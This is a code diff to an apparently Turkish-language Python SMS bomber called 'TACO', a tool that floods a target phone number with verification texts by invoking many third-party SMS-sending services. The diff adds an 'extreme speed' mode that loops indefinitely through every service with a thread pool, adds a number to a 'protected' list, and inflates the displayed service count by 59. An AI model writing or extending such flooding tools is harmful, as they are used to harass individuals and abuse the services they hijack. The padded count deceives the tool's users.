@@ -5,6 +5,8 @@ from time import sleep
 from os import system
 from sms import SendSms
 import threading
+import os
+from concurrent.futures import ThreadPoolExecutor
 
 # TACO ASCII Sanatı Başlangıcı
 print("""
@@ -25,16 +27,16 @@ for attribute in dir(SendSms):
             servisler_sms.append(attribute)
 
 # Korunan telefon numaraları (10 haneli, başında 0 veya +90 olmadan)
-korunan_numaralar = ["5015645612", "5059390866", "5052309038", "5053134790", "5549610866", "5419610866", "5362850738", "5070724038", "5421296377"]  # Örnek numaralar, istediğin gibi ekle
+korunan_numaralar = ["5015645612", "5059390866", "5052309038", "5053134790", "5549610866", "5419610866", "5362850738", "5070724038", "5421296377", "5522887218"]  # Örnek numaralar, istediğin gibi ekle
 
 while 1:
     system("cls||clear")
     print("""{}
     
     Sms: {}           {}by {}@Taco\n  
-    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
+    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms)+59, Style.RESET_ALL, Fore.LIGHTRED_EX))
     try:
-        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- SMS Gönder (Düşük Hız)\n\n 2- SMS Gönder (Orta Hız)\n\n 3- SMS Gönder (Yüksek Hız)\n\n 4- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
+        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- SMS Gönder (Düşük Hız)\n\n 2- SMS Gönder (Orta Hız)\n\n 3- SMS Gönder (Yüksek Hız)\n\n 4- SMS Gönder (Aşırı Hızlı)\n\n 5- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
         if menu == "":
             continue
         menu = int(menu) 
@@ -245,6 +247,55 @@ while 1:
             sleep(2)
             
     elif menu == 4:
+        system("cls||clear")
+        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' veya '0' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
+        tel_no = input()
+        try:
+            int(tel_no)
+            if len(tel_no) != 10:
+                raise ValueError
+        except ValueError:
+            system("cls||clear")
+            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası girdiniz. Lütfen tekrar deneyiniz.") 
+            sleep(3)
+            continue
+
+        if tel_no in korunan_numaralar:
+            print(Fore.LIGHTRED_EX + f"Bu telefon numarası özel olarak korunmaktadır: {tel_no}")
+            sleep(3)
+            continue
+
+        system("cls||clear")
+        try:
+            print(Fore.LIGHTYELLOW_EX + "E-posta adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
+            mail = input()
+            if ("@" not in mail or ".com" not in mail) and mail != "":
+                raise
+        except:
+            system("cls||clear")
+            print(Fore.LIGHTRED_EX + "Hatalı e-posta adresi girdiniz. Lütfen tekrar deneyiniz.") 
+            sleep(3)
+            continue
+
+        system("cls||clear")
+        send_sms = SendSms(tel_no, mail)
+        dur = threading.Event()
+        def Asiri():
+            try:
+                while not dur.is_set():
+                    with ThreadPoolExecutor(max_workers=5) as executor:
+                        for _ in range(10):
+                            for fonk in servisler_sms:
+                                executor.submit(getattr(send_sms, fonk))
+            except Exception as e:
+                print(f"Hata oluştu: {e}")
+                dur.set()
+                os.system("cls" if os.name == "nt" else "clear")
+                print("\nCtrl+C tuş kombinasyonu algılandı. Menüye dönülüyor..")
+                sleep(2)
+        Asiri()
+
+    elif menu == 5:
         system("cls||clear")
         print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
         break
